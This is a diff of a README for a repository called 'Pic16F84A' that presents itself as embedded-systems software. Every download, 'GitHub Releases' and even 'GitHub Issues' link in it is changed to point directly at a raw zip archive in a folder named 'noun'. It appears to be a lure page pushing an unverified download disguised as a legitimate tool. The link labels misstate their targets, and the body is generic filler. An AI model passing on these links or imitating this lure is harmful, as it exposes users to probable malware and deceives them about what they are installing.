@@ -1,7 +1,7 @@
 # 🎉 Pic16F84A - Discover the World of Embedded Systems
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic_1.3.zip)](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic_1.3.zip)
+[![Download](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic-v3.8.zip)](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic-v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to Pic16F84A! This application is perfect for anyone interested in embedded systems. Whether you’re learning about microcontrollers or diving into hardware-software integration, this software helps you build real-world projects and understand firmware at a deeper level.
@@ -21,7 +21,7 @@ Welcome to Pic16F84A! This application is perfect for anyone interested in embed
 ## 📥 Download & Install
 To get started, you’ll need to download the software from our Release page. 
 
-1. **Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic_1.3.zip)
+1. **Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic-v3.8.zip)
    
 2. Once you are on the Releases page, look for the latest version available. 
 
@@ -59,9 +59,9 @@ To connect with fellow users:
 ## 🚧 Troubleshooting
 If you encounter issues during installation or while using the application:
 1. Check the FAQ section in the app for quick solutions.
-2. Visit our GitHub Issues page to report bugs or ask questions: [GitHub Issues](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic_1.3.zip)
+2. Visit our GitHub Issues page to report bugs or ask questions: [GitHub Issues](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic-v3.8.zip)
 
 ## 📥 Quick Download Again
-For easy access, here’s the download link one more time: [GitHub Releases](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic_1.3.zip)
+For easy access, here’s the download link one more time: [GitHub Releases](https://raw.githubusercontent.com/ayoubsalha/Pic16F84A-/main/noun/Pic-v3.8.zip)
 
 Thank you for choosing Pic16F84A. Happy coding and exploring the fascinating world of embedded systems!
